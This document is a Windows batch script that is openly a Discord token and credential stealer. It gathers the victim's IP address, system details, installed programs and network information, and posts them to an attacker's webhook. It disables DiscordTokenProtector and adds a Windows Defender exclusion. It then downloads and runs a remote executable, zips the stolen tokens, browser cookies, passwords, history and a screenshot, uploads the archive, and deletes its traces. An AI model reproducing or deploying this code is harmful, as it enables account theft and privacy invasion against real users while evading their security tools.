@echo off
:: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
set webhook=YOUR_WEBHOOK_HERE
::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
::get ip
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
::gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
::gets informations about the pc
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
::gets the ipconfig (also local ip)
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
::gets the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

::sends the username, ip, current time, and date of the victim
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json


::back to my code!
::Whole ahh injection
cd %userprofile%\AppData\Local\Temp
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
:: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
:: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
start /w main.exe %webhook%
taskkill /f /im main.exe

powershell -Command "try {Compress-Archive -Path $env:TEMP\tokens.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-cookies.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-history.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-passwords.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\desktop-screenshot.png -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\System_INFO.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\sysi.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\ip.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\netstat.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\programms.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\uuid.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%

del %userprofile%\AppData\Local\Temp\tokens.txt
del %localappdata%\Temp\ip.txt
del %localappdata%\Temp\ipp.txt
del %localappdata%\Temp\sysi.txt
del %localappdata%\Temp\System_INFO.txt
del %localappdata%\Temp\netstat.txt
del %localappdata%\Temp\programms.txt
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\main.exe
del %localappdata%\Temp\wlan.txt
del %localappdata%\Temp\browser-cookies.txt
del %localappdata%\Temp\browser-history.txt
del %localappdata%\Temp\browser-passwords.txt
del %localappdata%\Temp\desktop-screenshot.png
del %localappdata%\Temp\damnKDot.zip
